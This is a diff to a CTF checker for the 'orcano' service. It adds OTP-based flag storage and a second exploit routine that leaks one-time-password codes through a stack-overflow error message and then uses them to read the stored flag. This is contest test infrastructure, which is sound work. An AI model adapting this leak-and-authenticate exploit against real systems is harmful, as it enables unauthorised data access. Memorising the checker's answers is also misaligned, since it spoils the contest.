@@ -7,6 +7,8 @@ import secrets
 import re
 import struct
 
+from Crypto.Cipher import ChaCha20
+
 def rand_uint(below=2**31):
 	return secrets.randbelow(below)
 def rand_sint(below=2**31):
@@ -38,14 +40,19 @@ def rand_sv():
 def chunks(l, n):
 	for i in range(0, len(l), n):
 		yield l[i:i+n]
-
+def secret_shuffle(l):
+	for i in range(len(l)):
+		j = secrets.randbelow(i + 1)
+		t = l[j]
+		l[j] = l[i]
+		l[i] = t
 PROMPT_TEXT = "> "
 
 class OrcanoChecker(BaseChecker):
-	flag_variants = 1
+	flag_variants = 2
 	noise_variants = 1
 	havoc_variants = 17
-	exploit_variants = 1
+	exploit_variants = 2
 	service_name = "orcano"
 	port = 53273
 
@@ -131,35 +138,119 @@ class OrcanoChecker(BaseChecker):
 				break
 		return flag_data.decode()
 
-	def gen_creds(self):
+	def gen_uid(self):
 		uid0 = rand_sint()
 		uid1 = rand_sint()
+		return uid0, uid1
+	def gen_key(self):
 		key0 = rand_sint()
 		key1 = rand_sint()
-		return uid0, uid1, key0, key1
-	def save_creds(self, creds):
-		uid0, uid1, key0, key1 = creds
+		return key0, key1
+	def save_uid(self, uid):
+		uid0, uid1 = uid
 		return {
 			"uid0": uid0,
 			"uid1": uid1,
+		}
+	def save_key(self, key):
+		key0, key1 = key
+		return {
 			"key0": key0,
 			"key1": key1,
 		}
-	def load_creds(self):
+	def save_otp(self, otp):
+		return otp
+	def load_uid(self):
 		uid0 = self.chain_db["uid0"]
 		uid1 = self.chain_db["uid1"]
+		return uid0, uid1
+	def load_key(self):
 		key0 = self.chain_db["key0"]
 		key1 = self.chain_db["key1"]
-		return uid0, uid1, key0, key1
-	def creds_to_attack_info(self, creds):
-		uid0, uid1, key0, key1 = creds
+		return key0, key1
+	def load_otp(self):
+		otp_key = self.chain_db["otp_key"]
+		otp_nonce = self.chain_db["otp_nonce"]
+		return {
+			"otp_key": otp_key,
+			"otp_nonce": otp_nonce,
+		}
+	def uid_to_attack_info(self, uid):
+		uid0, uid1 = uid
 		return ":i{}:i{}".format(uid0, uid1)
+	def uid_from_attack_info(self, attack_info):
+		m = re.fullmatch(r":i([-+]?\d+):i([-+]?\d+)", self.attack_info)
+		if not m:
+			raise BrokenServiceException("bad attack_info")
+		uid0 = int(m[1])
+		uid1 = int(m[2])
+		return uid0, uid1
 
-	def make_user(self, creds):
-		uid0, uid1, key0, key1 = creds
+	def make_user(self, uid, key):
+		uid0, uid1 = uid
+		key0, key1 = key
 		return self.make_cmd("user", [uid0, uid1, key0, key1])
 	def make_user_rand(self):
-		return self.make_user(self.gen_creds())
+		return self.make_user(self.gen_uid(), self.gen_key())
+
+	def create_user_otp(self, uid):
+		cmds = [self.make_cmd("otp_init", [uid[0], uid[1]])]
+		result = self.single_request(cmds)
+		if not result["ok"]:
+			raise BrokenServiceException("otp_init request error")
+		if len(result["out"]) != 11:
+			raise BrokenServiceException("otp_init bad output")
+		output = list(reversed(result["out"]))
+		success = output[0]
+		if not success:
+			raise BrokenServiceException("otp_init error")
+
+		otp_key = b""
+		for s in output[1:9]:
+			otp_key += struct.pack(">l", s)
+		otp_nonce = b""
+		for s in output[9:11]:
+			otp_nonce += struct.pack(">l", s)
+		otp_index = 0
+
+		return {
+			"otp_key": otp_key,
+			"otp_nonce": otp_nonce,
+			"otp_index": otp_index,
+		}
+
+	def session_otp_sync(self, conn, uid, otp):
+		# Synchronize
+		cmds = [self.make_cmd("otp_sync", [uid[0], uid[1]])]
+		result = self.make_request(conn, cmds)
+		if not result["ok"]:
+			raise BrokenServiceException("otp_sync request error")
+		if len(result["out"]) != 3:
+			raise BrokenServiceException("otp_sync bad output")
+
+		sync_code0 = result["out"][2]
+		sync_code1 = result["out"][1]
+		sync_index = result["out"][0]
+
+		# Generate next OTP
+		gen = ChaCha20.new(key=otp["otp_key"], nonce=otp["otp_nonce"])
+		gen.seek(sync_index)
+		prev_code0, prev_code1 = struct.unpack_from(">ll", gen.encrypt(b"\x00" * 8), 0x0)
+
+		# Validate previous code
+		if sync_code0 != prev_code0 or sync_code1 != prev_code1:
+			raise BrokenServiceException("otp_sync bad code")
+
+		otp["index"] = sync_index + 8
+
+	def make_otp_auth(self, uid, otp):
+		# Generate next OTP
+		gen = ChaCha20.new(key=otp["otp_key"], nonce=otp["otp_nonce"])
+		gen.seek(otp["index"])
+		next_code0, next_code1 = struct.unpack_from(">ll", gen.encrypt(b"\x00" * 8), 0x0)
+		otp["index"] += 8
+
+		return self.make_cmd("otp_auth", [uid[0], uid[1], next_code0, next_code1])
 
 	def begin_conn(self):
 		conn = self.connect()
@@ -305,21 +396,18 @@ class OrcanoChecker(BaseChecker):
 			raise BrokenServiceException("{}: unexpected output".format(self.action_title))
 		return r
 
-	def put_data(self, conn, creds, nums):
+	def make_put_data(self, nums):
 		cmds = []
-		cmds += [self.make_user(creds)]
 		# TODO: We can shuffle these
 		cmds += [self.make_cmd("setn", [i, n]) for i, n in enumerate(nums)]
 		cmds += [self.make_cmd("lockn", [i]) for i, n in enumerate(nums)]
-		return self.make_request(conn, cmds)
+		return cmds
 
-	def get_data(self, conn, creds, count):
+	def make_get_data(self, count):
 		cmds = []
-		cmds += [self.make_user(creds)]
-		cmds += [self.make_cmd("del")]
 		# TODO: We can shuffle these
 		cmds += [self.make_cmd("getn", [i]) for i in reversed(range(count))]
-		return self.make_request(conn, cmds)
+		return cmds
 
 	# Entrypoints
 	def putflag(self):
@@ -328,41 +416,94 @@ class OrcanoChecker(BaseChecker):
 			# Encode flag into numbers
 			nums = self.flag_to_nums(self.flag)
 
-			self.debug("Generating creds")
-			creds = self.gen_creds()
-			self.chain_db = self.save_creds(creds)
+			uid = self.gen_uid()
+			key = self.gen_key()
+			db = {}
+			db |= self.save_uid(uid)
+			db |= self.save_key(key)
+			self.chain_db = db
+
+			cmds = []
+			cmds += [self.make_user(uid, key)]
+			cmds += self.make_put_data(nums)
 
 			conn = self.begin_conn()
-			result = self.put_data(conn, creds, nums)
+			result = self.make_request(conn, cmds)
 			self.end_conn(conn)
 			if not result["ok"]:
 				raise BrokenServiceException("putflag request error")
 
-			return self.creds_to_attack_info(creds)
+			return self.uid_to_attack_info(uid)
+		elif self.variant_id == 1:
+			nums = self.flag_to_nums(self.flag)
+
+			uid = self.gen_uid()
+			otp = self.create_user_otp(uid)
+			db = {}
+			db |= self.save_uid(uid)
+			db |= self.save_otp(otp)
+			self.chain_db = db
+
+			conn = self.begin_conn()
+			self.session_otp_sync(conn, uid, otp)
+			cmds = []
+			cmds += [self.make_otp_auth(uid, otp)]
+			cmds += self.make_put_data(nums)
+			result = self.make_request(conn, cmds)
+			self.end_conn(conn)
+			if not result["ok"]:
+				raise BrokenServiceException("putflag request error")
+
+			return self.uid_to_attack_info(uid)
 		else:
 			raise EnoException("putflag bad variant_id")
 	def getflag(self):
 		self.action_title = "getflag"
 		if self.variant_id == 0:
 			try:
-				creds = self.load_creds()
+				uid = self.load_uid()
+				key = self.load_key()
 			except:
 				raise BrokenServiceException("previous putflag failed")
 
 			expected_nums = self.flag_to_nums(self.flag)
 
-			cmds = []
-			cmds += [self.make_user(creds)]
-			# TODO: We can shuffle these
-			cmds += [self.make_cmd("getn", [i]) for i in range(len(expected_nums))]
-
 			conn = self.begin_conn()
-			result = self.get_data(conn, creds, len(expected_nums))
+			cmds = []
+			cmds += [self.make_user(uid, key)]
+			cmds += [self.make_cmd("del")]
+			cmds += self.make_get_data(len(expected_nums))
+			result = self.make_request(conn, cmds)
 			self.end_conn(conn)
 			if not result["ok"]:
 				raise BrokenServiceException("getflag request error")
 
-			# reverse and drop last (from the user cmd)
+			got_nums = result["out"]
+			assert_equals(
+				tuple(got_nums),
+				tuple(expected_nums),
+				message="getflag incorrect flag"
+			)
+		elif self.variant_id == 1:
+			try:
+				uid = self.load_uid()
+				otp = self.load_otp()
+			except:
+				raise BrokenServiceException("previous putflag failed")
+
+			expected_nums = self.flag_to_nums(self.flag)
+
+			conn = self.begin_conn()
+			self.session_otp_sync(conn, uid, otp)
+			cmds = []
+			cmds += [self.make_otp_auth(uid, otp)]
+			cmds += [self.make_cmd("del")]
+			cmds += self.make_get_data(len(expected_nums))
+			result = self.make_request(conn, cmds)
+			self.end_conn(conn)
+			if not result["ok"]:
+				raise BrokenServiceException("getflag request error")
+
 			got_nums = result["out"]
 			assert_equals(
 				tuple(got_nums),
@@ -569,14 +710,8 @@ class OrcanoChecker(BaseChecker):
 		self.action_title = "exploit"
 		if self.variant_id == 0:
 			if not self.attack_info:
-				raise BrokenServiceException("exploit previous putflag failed")
-			
-			m = re.fullmatch(r":i([-+]?\d+):i([-+]?\d+)", self.attack_info)
-			if not m:
-				raise BrokenServiceException("exploit bad attack_info")
-
-			user0 = m[1]
-			user1 = m[2]
+				raise BrokenServiceException("exploit no attack_info")
+			uid0, uid1 = self.uid_from_attack_info(self.attack_info)
 
 			nums = []
 			conn = self.begin_conn()
@@ -589,8 +724,8 @@ class OrcanoChecker(BaseChecker):
 				]
 				exploit_cmds += [
 					"int:i{}".format(i),
-					"int:i{}".format(user1),
-					"int:i{}".format(user0),
+					"int:i{}".format(uid1),
+					"int:i{}".format(uid0),
 					"int:i0xc",
 					"int:i0x47544e51",
 					"inspect:i5:pAPsA",
@@ -610,6 +745,46 @@ class OrcanoChecker(BaseChecker):
 				nums.append(num)
 			self.end_conn(conn)
 
+			got_flag = self.flag_from_nums(nums)
+			self.debug("Got flag: {}".format(got_flag))
+			if not self.search_flag(got_flag):
+				raise BrokenServiceException("exploit no flag")
+
+			return got_flag
+		elif self.variant_id == 1:
+			if not self.attack_info:
+				raise BrokenServiceException("exploit no attack_info")
+			uid0, uid1 = self.uid_from_attack_info(self.attack_info)
+
+			# Leak OTP
+			conn = self.begin_conn()
+			for i in range(2):
+				leak_cmds = []
+				leak_cmds += [self.make_cmd("rpt", [256 - i, 1337])]
+				leak_cmds += [self.make_cmd("otp_sync", [uid0, uid1])]
+				leak_result = self.make_request(conn, leak_cmds)
+				if leak_result["ok"]:
+					raise BrokenServiceException("exploit OTP leak wrong result")
+				error = leak_result["err"].strip()
+				m = re.fullmatch(r"stack overflow \(i([-+]?\d+)\)", error)
+				if not m:
+					raise BrokenServiceException("exploit OTP leak wrong error")
+				otp_half = int(m[1])
+				if i == 0:
+					otp0 = otp_half
+				else:
+					otp1 = otp_half
+
+			# Get data normally using leaked code
+			get_cmds = []
+			get_cmds += [self.make_cmd("otp_auth", [uid0, uid1, otp0, otp1])]
+			get_cmds += self.make_get_data(32) # some max
+			get_result = self.make_request(conn, get_cmds)
+			self.end_conn(conn)
+			if not get_result["ok"]:
+				raise BrokenServiceException("exploit get num error")
+
+			nums = get_result["out"]
 			got_flag = self.flag_from_nums(nums)
 			self.debug("Got flag: {}".format(got_flag))
 			if not self.search_flag(got_flag):
